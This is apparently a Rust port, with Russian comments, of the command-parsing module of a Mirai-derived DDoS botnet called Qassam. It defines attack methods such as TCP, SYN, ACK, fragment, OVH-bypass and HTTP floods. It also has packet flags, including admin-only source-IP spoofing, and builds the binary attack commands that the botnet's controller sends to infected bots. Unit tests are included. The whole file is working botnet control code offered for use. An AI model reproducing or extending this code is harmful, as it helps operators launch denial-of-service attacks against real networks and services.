use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::str::FromStr;
use byteorder::{BigEndian, WriteBytesExt};
use shellwords;
use thiserror::Error;



// Типизированные ошибки
#[derive(Error, Debug, Clone, PartialEq)]
pub enum AttackError {
    #[error("Must specify an attack name")]
    NoAttackName,
    #[error("Must specify prefix/netmask as targets")]
    NoTargets,
    #[error("Must specify an attack duration")]
    NoDuration,
    #[error("Blank target specified")]
    BlankTarget,
    #[error("Invalid attack name: {0}")]
    InvalidAttackName(String),
    #[error("Invalid netmask near {0}")]
    InvalidNetmask(String),
    #[error("Too many /'s in prefix near {0}")]
    TooManySlashes(String),
    #[error("Failed to parse IP address near {0}")]
    InvalidIPAddress(String),
    #[error("Cannot specify more than 255 targets in a single attack")]
    TooManyTargets,
    #[error("Invalid attack duration near {0}. Duration must be between 1 and 86400 seconds")]
    InvalidDuration(String),
    #[error("Invalid key=value flag combination near {0}")]
    InvalidFlagFormat(String),
    #[error("Invalid flag key {0}, near {1}")]
    InvalidFlagKey(String, String),
    #[error("Cannot have more than 255 flags")]
    TooManyFlags,
    #[error("Flag value cannot be more than 255 bytes")]
    FlagValueTooLong,
    #[error("Max buffer size is 4096 bytes")]
    BufferTooLarge,
    #[error("Failed to parse attack string: {0}")]
    ParseError(String),
    #[error("Help: {0}")]
    HelpMessage(String),
}

// Аналог QassamAttackInfo
#[derive(Debug, Clone, PartialEq)]
pub struct QassamAttackInfo {
    pub attack_id: u8,
    pub attack_flags: Vec<u8>,
    pub attack_description: String,
}

// Аналог Attack
#[derive(Debug, Clone, PartialEq)]
pub struct QassamAttack {
    pub duration: u32,
    pub attack_type: u8,
    pub targets: HashMap<u32, u8>, // key: IP в сетевом порядке (big endian), value: netmask
    pub flags: HashMap<u8, String>,
}

// Аналог FlagInfo
#[derive(Debug, Clone, PartialEq)]
pub struct FlagInfo {
    pub flag_id: u8,
    pub flag_description: String,
}

// Константы
const MAX_TARGETS: usize = 255;
const MAX_FLAGS: usize = 255;
const MAX_BUFFER_SIZE: usize = 4096;
const MAX_DURATION: u32 = 86400;

// Глобальные lookup таблицы
lazy_static::lazy_static! {
    pub static ref FLAG_INFO_LOOKUP: HashMap<&'static str, FlagInfo> = {
        let mut m = HashMap::new();
        m.insert("len", FlagInfo {
            flag_id: 0,
            flag_description: "Size of packet data, default is 512 bytes".to_string(),
        });
        m.insert("rand", FlagInfo {
            flag_id: 1,
            flag_description: "Randomize packet data content, default is 1 (yes)".to_string(),
        });
        m.insert("tos", FlagInfo {
            flag_id: 2,
            flag_description: "TOS field value in IP header, default is 0".to_string(),
        });
        m.insert("ident", FlagInfo {
            flag_id: 3,
            flag_description: "ID field value in IP header, default is random".to_string(),
        });
        m.insert("ttl", FlagInfo {
            flag_id: 4,
            flag_description: "TTL field in IP header, default is 255".to_string(),
        });
        m.insert("df", FlagInfo {
            flag_id: 5,
            flag_description: "Set the Dont-Fragment bit in IP header, default is 0 (no)".to_string(),
        });
        m.insert("sport", FlagInfo {
            flag_id: 6,
            flag_description: "Source port, default is random".to_string(),
        });
        m.insert("dport", FlagInfo {
            flag_id: 7,
            flag_description: "Destination port, default is random".to_string(),
        });
        m.insert("domain", FlagInfo {
            flag_id: 8,
            flag_description: "Domain name to attack".to_string(),
        });
        m.insert("dhid", FlagInfo {
            flag_id: 9,
            flag_description: "Domain name transaction ID, default is random".to_string(),
        });
        m.insert("urg", FlagInfo {
            flag_id: 11,
            flag_description: "Set the URG bit in IP header, default is 0 (no)".to_string(),
        });
        m.insert("ack", FlagInfo {
            flag_id: 12,
            flag_description: "Set the ACK bit in IP header, default is 0 (no) except for ACK flood".to_string(),
        });
        m.insert("psh", FlagInfo {
            flag_id: 13,
            flag_description: "Set the PSH bit in IP header, default is 0 (no)".to_string(),
        });
        m.insert("rst", FlagInfo {
            flag_id: 14,
            flag_description: "Set the RST bit in IP header, default is 0 (no)".to_string(),
        });
        m.insert("syn", FlagInfo {
            flag_id: 15,
            flag_description: "Set the ACK bit in IP header, default is 0 (no) except for SYN flood".to_string(),
        });
        m.insert("fin", FlagInfo {
            flag_id: 16,
            flag_description: "Set the FIN bit in IP header, default is 0 (no)".to_string(),
        });
        m.insert("seqnum", FlagInfo {
            flag_id: 17,
            flag_description: "Sequence number value in TCP header, default is random".to_string(),
        });
        m.insert("acknum", FlagInfo {
            flag_id: 18,
            flag_description: "Ack number value in TCP header, default is random".to_string(),
        });
        m.insert("gcip", FlagInfo {
            flag_id: 19,
            flag_description: "Set internal IP to destination ip, default is 0 (no)".to_string(),
        });
        m.insert("method", FlagInfo {
            flag_id: 20,
            flag_description: "HTTP method name, default is get".to_string(),
        });
        m.insert("postdata", FlagInfo {
            flag_id: 21,
            flag_description: "POST data, default is empty/none".to_string(),
        });
        m.insert("path", FlagInfo {
            flag_id: 22,
            flag_description: "HTTP path, default is /".to_string(),
        });
        m.insert("conns", FlagInfo {
            flag_id: 24,
            flag_description: "Number of connections".to_string(),
        });
        m.insert("source", FlagInfo {
            flag_id: 25,
            flag_description: "Source IP address, 255.255.255.255 for random".to_string(),
        });
        m.insert("minlen", FlagInfo {
            flag_id: 26,
            flag_description: "min len".to_string(),
        });
        m.insert("maxlen", FlagInfo {
            flag_id: 27,
            flag_description: "max len".to_string(),
        });
        m.insert("payload", FlagInfo {
            flag_id: 28,
            flag_description: "custom payload".to_string(),
        });
        m.insert("repeat", FlagInfo {
            flag_id: 29,
            flag_description: "number of times to repeat".to_string(),
        });
        m
    };

    pub static ref ATTACK_INFO_LOOKUP: HashMap<&'static str, QassamAttackInfo> = {
        let mut m = HashMap::new();
        m.insert("!tcpflood", QassamAttackInfo {
            attack_id: 2,
            attack_flags: vec![2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25],
            attack_description: "tcp flood (urg,ack,syn)".to_string(),
        });
        m.insert("!customflood", QassamAttackInfo {
            attack_id: 0,
            attack_flags: vec![0, 1, 7],
            attack_description: "Custom method".to_string(),
        });
        m.insert("!stdflood", QassamAttackInfo {
            attack_id: 1,
            attack_flags: vec![0, 1, 7],
            attack_description: "std flood (uid1 supported)".to_string(),
        });
        m.insert("!vseflood", QassamAttackInfo {
            attack_id: 4,
            attack_flags: vec![2, 3, 4, 5, 6, 7],
            attack_description: "Valve source engine specific flood".to_string(),
        });
        m.insert("!ackflood", QassamAttackInfo {
            attack_id: 3,
            attack_flags: vec![0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25],
            attack_description: "ACK flood".to_string(),
        });
        m.insert("!ovhbypass", QassamAttackInfo {
            attack_id: 5,
            attack_flags: vec![0, 1, 7],
            attack_description: "OVH UDP Hex Flood".to_string(),
        });
        m.insert("!stompflood", QassamAttackInfo {
            attack_id: 6,
            attack_flags: vec![0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16],
            attack_description: "TCP stomp flood".to_string(),
        });
        m.insert("!synflood", QassamAttackInfo {
            attack_id: 7,
            attack_flags: vec![2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25],
            attack_description: "tcp based syn flood".to_string(),
        });
        m.insert("!fragflood", QassamAttackInfo {
            attack_id: 8,
            attack_flags: vec![2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25],
            attack_description: "TCP FRAG Packet Flood".to_string(),
        });
        m.insert("!httpflood", QassamAttackInfo {
            attack_id: 9,
            attack_flags: vec![8, 7, 20, 21, 22, 24],
            attack_description: "http flood".to_string(),
        });
        m
    };
}

impl QassamAttack {
    pub fn qassam_new(attack_str: &str, admin: i32) -> Result<Self, AttackError> {
        let mut attack = QassamAttack {
            duration: 0,
            attack_type: 0,
            targets: HashMap::new(),
            flags: HashMap::new(),
        };

        let args = shellwords::split(attack_str)
            .map_err(|e| AttackError::ParseError(e.to_string()))?;

        let mut args_iter = args.into_iter();

        // Parse attack name
        let attack_name = args_iter.next().ok_or(AttackError::NoAttackName)?;

        if attack_name == "?" {
            let help_msg = Self::qassam_generate_attack_help();
            return Err(AttackError::HelpMessage(help_msg));
        }

        let attack_info = ATTACK_INFO_LOOKUP.get(attack_name.as_str())
            .ok_or_else(|| AttackError::InvalidAttackName(attack_name.clone()))?;

        attack.attack_type = attack_info.attack_id;

        // Parse targets
        let targets_str = args_iter.next().ok_or(AttackError::NoTargets)?;

        if targets_str == "?" {
            let help_msg = "\x1b[37;1mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29".to_string();
            return Err(AttackError::HelpMessage(help_msg));
        }

        Self::qassam_parse_targets(&targets_str, &mut attack.targets)?;

        // Parse duration
        let duration_str = args_iter.next().ok_or(AttackError::NoDuration)?;

        if duration_str == "?" {
            let help_msg = "\x1b[37;1mDuration of the attack, in seconds".to_string();
            return Err(AttackError::HelpMessage(help_msg));
        }

        attack.duration = Self::qassam_parse_duration(&duration_str)?;

        // Parse flags
        Self::qassam_parse_flags(args_iter, attack_info, admin, &mut attack.flags)?;

        Ok(attack)
    }

    fn qassam_generate_attack_help() -> String {
        let mut help = "\x1b[37;1mAvailable attack list\r\n\x1b[36;1m".to_string();
        for (cmd_name, atk_info) in ATTACK_INFO_LOOKUP.iter() {
            help.push_str(&format!("{}: {}\r\n", cmd_name, atk_info.attack_description));
        }
        help
    }

    fn qassam_parse_targets(targets_str: &str, targets: &mut HashMap<u32, u8>) -> Result<(), AttackError> {
        let cidr_args: Vec<&str> = targets_str.split(',').collect();

        if cidr_args.len() > MAX_TARGETS {
            return Err(AttackError::TooManyTargets);
        }

        for cidr in cidr_args {
            if cidr.is_empty() {
                return Err(AttackError::BlankTarget);
            }

            let cidr_parts: Vec<&str> = cidr.split('/').collect();
            let prefix = cidr_parts[0];
            let netmask = Self::qassam_parse_netmask(&cidr_parts, cidr)?;

            let ip = Ipv4Addr::from_str(prefix)
                .map_err(|_| AttackError::InvalidIPAddress(cidr.to_string()))?;

            let ip_u32 = u32::from(ip).to_be();
            targets.insert(ip_u32, netmask);
        }

        Ok(())
    }

    fn qassam_parse_netmask(cidr_parts: &[&str], cidr: &str) -> Result<u8, AttackError> {
        match cidr_parts.len() {
            1 => Ok(32), // default netmask
            2 => {
                cidr_parts[1].parse()
                    .map_err(|_| AttackError::InvalidNetmask(cidr.to_string()))
                    .and_then(|n: u8| {
                        if n > 32 {
                            Err(AttackError::InvalidNetmask(cidr.to_string()))
                        } else {
                            Ok(n)
                        }
                    })
            }
            _ => Err(AttackError::TooManySlashes(cidr.to_string())),
        }
    }

    fn qassam_parse_duration(duration_str: &str) -> Result<u32, AttackError> {
        duration_str.parse()
            .map_err(|_| AttackError::InvalidDuration(duration_str.to_string()))
            .and_then(|d| {
                if d == 0 || d > MAX_DURATION {
                    Err(AttackError::InvalidDuration(duration_str.to_string()))
                } else {
                    Ok(d)
                }
            })
    }

    fn qassam_parse_flags(
        args_iter: impl Iterator<Item = String>,
        attack_info: &QassamAttackInfo,
        admin: i32,
        flags: &mut HashMap<u8, String>,
    ) -> Result<(), AttackError> {
        for arg in args_iter {
            if arg == "?" {
                let help_msg = Self::qassam_generate_flags_help(attack_info);
                return Err(AttackError::HelpMessage(help_msg));
            }

            let (flag_name, mut flag_value) = Self::qassam_parse_flag_pair(&arg)?;
            let flag_info = FLAG_INFO_LOOKUP.get(flag_name)
                .ok_or_else(|| AttackError::InvalidFlagKey(flag_name.to_string(), arg.clone()))?;

            if !attack_info.attack_flags.contains(&flag_info.flag_id) {
                return Err(AttackError::InvalidFlagKey(flag_name.to_string(), arg));
            }

            if admin == 0 && flag_info.flag_id == 25 {
                return Err(AttackError::InvalidFlagKey(flag_name.to_string(), arg));
            }

            Self::qassam_process_flag_value(&mut flag_value);
            flags.insert(flag_info.flag_id, flag_value);
        }

        if flags.len() > MAX_FLAGS {
            return Err(AttackError::TooManyFlags);
        }

        Ok(())
    }

    fn qassam_parse_flag_pair(arg: &str) -> Result<(&str, String), AttackError> {
        let flag_parts: Vec<&str> = arg.splitn(2, '=').collect();
        if flag_parts.len() != 2 {
            return Err(AttackError::InvalidFlagFormat(arg.to_string()));
        }
        Ok((flag_parts[0], flag_parts[1].to_string()))
    }

    fn qassam_process_flag_value(flag_value: &mut String) {
        // Remove quotes if present
        if flag_value.starts_with('"') && flag_value.ends_with('"') {
            *flag_value = flag_value[1..flag_value.len()-1].to_string();
        }

        // Convert boolean values
        match flag_value.as_str() {
            "true" => *flag_value = "1".to_string(),
            "false" => *flag_value = "0".to_string(),
            _ => {}
        }
    }

    fn qassam_generate_flags_help(attack_info: &QassamAttackInfo) -> String {
        let mut help = "\x1b[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n".to_string();

        for &flag_id in &attack_info.attack_flags {
            for (flag_name, flag_info) in FLAG_INFO_LOOKUP.iter() {
                if flag_id == flag_info.flag_id {
                    help.push_str(&format!("{}: {}\r\n", flag_name, flag_info.flag_description));
                    break;
                }
            }
        }

        help += "\r\nValue of 65535 for a flag denotes random (for ports, etc)\r\n";
        help += "Ex: seq=0\r\nEx: sport=0 dport=65535";
        help
    }

    pub fn qassam_build(&self) -> Result<Vec<u8>, AttackError> {
        let mut buf = Vec::new();

        // Duration (4 bytes)
        buf.write_u32::<BigEndian>(self.duration)
            .map_err(|_| AttackError::BufferTooLarge)?;

        // Attack type (1 byte)
        buf.push(self.attack_type);

        // Targets count (1 byte) and targets
        if self.targets.len() > MAX_TARGETS {
            return Err(AttackError::TooManyTargets);
        }
        buf.push(self.targets.len() as u8);

        for (&prefix, &netmask) in &self.targets {
            buf.write_u32::<BigEndian>(prefix)
                .map_err(|_| AttackError::BufferTooLarge)?;
            buf.push(netmask);
        }

        // Flags count (1 byte) and flags
        if self.flags.len() > MAX_FLAGS {
            return Err(AttackError::TooManyFlags);
        }
        buf.push(self.flags.len() as u8);

        for (key, value) in &self.flags {
            if value.len() > 255 {
                return Err(AttackError::FlagValueTooLong);
            }

            buf.push(*key);
            buf.push(value.len() as u8);
            buf.extend_from_slice(value.as_bytes());
        }

        // Check total size and prepend length
        if buf.len() + 2 > MAX_BUFFER_SIZE {
            return Err(AttackError::BufferTooLarge);
        }

        let total_len = (buf.len() + 2) as u16;
        let mut final_buf = Vec::with_capacity(buf.len() + 2);
        final_buf.write_u16::<BigEndian>(total_len)
            .map_err(|_| AttackError::BufferTooLarge)?;
        final_buf.extend(buf);

        Ok(final_buf)
    }

    // Вспомогательный метод для тестов
    #[cfg(test)]
    pub fn qassam_from_parts(duration: u32, attack_type: u8, targets: HashMap<u32, u8>, flags: HashMap<u8, String>) -> Self {
        Self {
            duration,
            attack_type,
            targets,
            flags,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_test_targets() -> HashMap<u32, u8> {
        let mut targets = HashMap::new();
        targets.insert(0x7f000001, 32); // 127.0.0.1
        targets.insert(0xc0a80001, 24); // 192.168.0.1/24
        targets
    }

    fn create_test_flags() -> HashMap<u8, String> {
        let mut flags = HashMap::new();
        flags.insert(0, "512".to_string()); // len
        flags.insert(1, "1".to_string());   // rand
        flags
    }

    #[test]
    fn test_attack_creation_success() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 60 len=512 rand=1", 1);
        assert!(attack.is_ok());

        let attack = attack.unwrap();
        assert_eq!(attack.attack_type, 2);
        assert_eq!(attack.duration, 60);
        assert_eq!(attack.targets.len(), 1);
        assert_eq!(attack.flags.len(), 2);
    }

    #[test]
    fn test_attack_creation_no_name() {
        let attack = QassamAttack::qassam_new("", 1);
        assert_eq!(attack.err(), Some(AttackError::NoAttackName));
    }

    #[test]
    fn test_attack_creation_invalid_name() {
        let attack = QassamAttack::qassam_new("invalid_attack 192.168.1.1 60", 1);
        assert!(matches!(attack.err(), Some(AttackError::InvalidAttackName(_))));
    }

    #[test]
    fn test_attack_creation_no_targets() {
        let attack = QassamAttack::qassam_new("!tcpflood", 1);
        assert_eq!(attack.err(), Some(AttackError::NoTargets));
    }

    #[test]
    fn test_attack_creation_no_duration() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1", 1);
        assert_eq!(attack.err(), Some(AttackError::NoDuration));
    }

    #[test]
    fn test_attack_creation_invalid_duration() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 0", 1);
        assert!(matches!(attack.err(), Some(AttackError::InvalidDuration(_))));

        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 86401", 1);
        assert!(matches!(attack.err(), Some(AttackError::InvalidDuration(_))));

        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 invalid", 1);
        assert!(matches!(attack.err(), Some(AttackError::InvalidDuration(_))));
    }

    #[test]
    fn test_attack_creation_too_many_targets() {
        let many_targets = "192.168.1.1,".repeat(256);
        let attack = QassamAttack::qassam_new(&format!("!tcpflood {} 60", many_targets), 1);
        assert_eq!(attack.err(), Some(AttackError::TooManyTargets));
    }

    #[test]
    fn test_attack_creation_invalid_ip() {
        let attack = QassamAttack::qassam_new("!tcpflood 999.999.999.999 60", 1);
        assert!(matches!(attack.err(), Some(AttackError::InvalidIPAddress(_))));
    }

    #[test]
    fn test_attack_creation_invalid_netmask() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1/33 60", 1);
        assert!(matches!(attack.err(), Some(AttackError::InvalidNetmask(_))));
    }

    #[test]
    fn test_attack_creation_too_many_slashes() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1/24/32 60", 1);
        assert!(matches!(attack.err(), Some(AttackError::TooManySlashes(_))));
    }

    #[test]
    fn test_attack_creation_blank_target() {
        let attack = QassamAttack::qassam_new("!tcpflood , 60", 1);
        assert_eq!(attack.err(), Some(AttackError::BlankTarget));
    }

    #[test]
    fn test_flag_parsing() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 60 len=512 rand=1 sport=1234", 1);
        assert!(attack.is_ok());

        let attack = attack.unwrap();
        assert_eq!(attack.flags.get(&0), Some(&"512".to_string()));
        assert_eq!(attack.flags.get(&1), Some(&"1".to_string()));
        assert_eq!(attack.flags.get(&6), Some(&"1234".to_string()));
    }

    #[test]
    fn test_flag_boolean_conversion() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 60 df=true rand=false", 1);
        assert!(attack.is_ok());

        let attack = attack.unwrap();
        assert_eq!(attack.flags.get(&5), Some(&"1".to_string())); // df
        assert_eq!(attack.flags.get(&1), Some(&"0".to_string())); // rand
    }

    #[test]
    fn test_flag_quoted_values() {
        let attack = QassamAttack::qassam_new("!httpflood 192.168.1.1 60 domain=\"example.com\" path=\"/test\"", 1);
        assert!(attack.is_ok());

        let attack = attack.unwrap();
        assert_eq!(attack.flags.get(&8), Some(&"example.com".to_string()));
        assert_eq!(attack.flags.get(&22), Some(&"/test".to_string()));
    }

    #[test]
    fn test_invalid_flag_format() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 60 invalid_flag", 1);
        assert!(matches!(attack.err(), Some(AttackError::InvalidFlagFormat(_))));
    }

    #[test]
    fn test_invalid_flag_key() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 60 invalid=value", 1);
        assert!(matches!(attack.err(), Some(AttackError::InvalidFlagKey(_, _))));
    }

    #[test]
    fn test_unauthorized_flag() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 60 source=1.2.3.4", 0); // admin=0
        assert!(matches!(attack.err(), Some(AttackError::InvalidFlagKey(_, _))));
    }

    #[test]
    fn test_help_messages() {
        // Test attack list help
        let attack = QassamAttack::qassam_new("?", 1);
        assert!(matches!(attack.err(), Some(AttackError::HelpMessage(_))));

        // Test targets help
        let attack = QassamAttack::qassam_new("!tcpflood ? 60", 1);
        assert!(matches!(attack.err(), Some(AttackError::HelpMessage(_))));

        // Test duration help
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 ?", 1);
        assert!(matches!(attack.err(), Some(AttackError::HelpMessage(_))));

        // Test flags help
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 60 ?", 1);
        assert!(matches!(attack.err(), Some(AttackError::HelpMessage(_))));
    }

    #[test]
    fn test_netmask_parsing() {
        // Test default netmask
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1 60", 1);
        assert!(attack.is_ok());
        let attack = attack.unwrap();
        assert_eq!(attack.targets.get(&0xc0a80101), Some(&32));

        // Test explicit netmask
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.0/24 60", 1);
        assert!(attack.is_ok());
        let attack = attack.unwrap();
        assert_eq!(attack.targets.get(&0xc0a80100), Some(&24));
    }

    #[test]
    fn test_multiple_targets() {
        let attack = QassamAttack::qassam_new("!tcpflood 192.168.1.1,10.0.0.1,8.8.8.8 60", 1);
        assert!(attack.is_ok());

        let attack = attack.unwrap();
        assert_eq!(attack.targets.len(), 3);
        assert!(attack.targets.contains_key(&0xc0a80101)); // 192.168.1.1
        assert!(attack.targets.contains_key(&0x0a000001)); // 10.0.0.1
        assert!(attack.targets.contains_key(&0x08080808)); // 8.8.8.8
    }

    #[test]
    fn test_shell_quoting() {
        let attack = QassamAttack::qassam_new("!tcpflood '192.168.1.1' 60 'len=512' 'rand=1'", 1);
        assert!(attack.is_ok());

        let attack = attack.unwrap();
        assert_eq!(attack.targets.len(), 1);
        assert_eq!(attack.flags.len(), 2);
    }

    #[test]
    fn test_build_attack() {
        let targets = create_test_targets();
        let flags = create_test_flags();

        let attack = QassamAttack::qassam_from_parts(60, 2, targets, flags);
        let result = attack.qassam_build();

        assert!(result.is_ok());
        let data = result.unwrap();
        assert!(!data.is_empty());
        assert!(data.len() <= MAX_BUFFER_SIZE);
    }

    #[test]
    fn test_build_with_long_flag_value() {
        let mut targets = HashMap::new();
        targets.insert(0x7f000001, 32);

        let mut flags = HashMap::new();
        flags.insert(0, "a".repeat(256)); // Too long

        let attack = QassamAttack::qassam_from_parts(60, 2, targets, flags);
        let result = attack.qassam_build();

        assert_eq!(result.err(), Some(AttackError::FlagValueTooLong));
    }
}